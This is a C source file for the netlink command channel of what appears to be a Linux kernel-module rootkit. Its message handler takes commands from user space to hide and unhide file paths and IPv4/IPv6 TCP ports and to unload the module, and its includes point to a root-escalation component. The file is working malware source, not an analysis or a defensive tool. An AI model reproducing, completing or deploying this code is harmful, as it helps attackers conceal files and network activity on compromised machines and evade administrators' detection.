#include "communicate.h"

#include "../operations_protocol.h"
#include "../msg_to_module.h"
#include "../msg_to_user.h"

#include "hidden_paths.h"
#include "hidden_tcp_ports.h"
#include "set_root_level.h"

extern void exit_my_module(void);

#define NETLINK_USER 31

static struct sock *nl_sk = NULL;
void my_recv_msg(struct sk_buff *skb) {
    struct nlmsghdr *nlh = (struct nlmsghdr *) skb->data;

    int sender_pid = nlh->nlmsg_pid; /* pid of process hwo snet the message */
    char *netlink_data = (char *) nlmsg_data(nlh);

    struct msg_to_module msg;
    memset((void*) &msg, '\x00', sizeof(struct msg_to_module));
    memcpy((void*) &msg, netlink_data, sizeof(struct msg_to_module));

    switch (msg.id) {
        case OPER_EXIT_MODULE: {
            exit_my_module();
            return;
        }
        case OPER_ADD_HIDDEN_PATH: {
            add_hidden_path(msg.data);
            break;
        }
        case OPER_REMOVE_HIDDEN_PATH: {
            remove_hidden_path(msg.data);
            break;
        }
        case OPER_ADD_HIDDEN_TCP4_PORT: {
            PORT port = *((PORT*) msg.data);
            add_hidden_tcp4_port(port);
            break;
        }
        case OPER_REMOVE_HIDDEN_TCP4_PORT: {
            PORT port = *((PORT*) msg.data);
            remove_hidden_tcp4_port(port);
            break;
        }

        case OPER_ADD_HIDDEN_TCP6_PORT: {
            PORT port = *((PORT*) msg.data);
            add_hidden_tcp6_port(port);
            break;
        }
        case OPER_REMOVE_HIDDEN_TCP6_PORT: {
            PORT port = *((PORT*) msg.data);
            remove_hidden_tcp6_port(port);
            break;
        }
    }

}

void my_send_msg(int pid, char *msg) {
    struct msg_to_user my_msg;
    memset((void *) &my_msg, '\x00', sizeof(struct msg_to_user));
    strncpy(my_msg.data, msg, strlen(msg));

    int msg_size = sizeof(struct msg_to_user);

    struct sk_buff *skb_out = nlmsg_new(msg_size, 0);
    if (!skb_out) {
         // failed to allocate new skb
        return;
    }

    struct nlmsghdr *nlh = nlmsg_put(skb_out, 0, 0, NLMSG_DONE, msg_size, 0);
    NETLINK_CB(skb_out).dst_group = 0; /* not in mcast group */

    strncpy((char *) nlmsg_data(nlh), (void *) &my_msg, msg_size);

    int res = nlmsg_unicast(nl_sk, skb_out, pid);
    if (res < 0) {
        // error while sending back to user
    }
}

int setup_my_channel(void) {
    struct netlink_kernel_cfg cfg = {
            .input = my_recv_msg,
    };

    nl_sk = netlink_kernel_create(&init_net, NETLINK_USER, &cfg);
    if (!nl_sk) {
        printk(KERN_ALERT
        "Error creating socket.\n");
        return -1;
    }

    return 0;
}

void close_my_channel(void) {
    netlink_kernel_release(nl_sk);
}
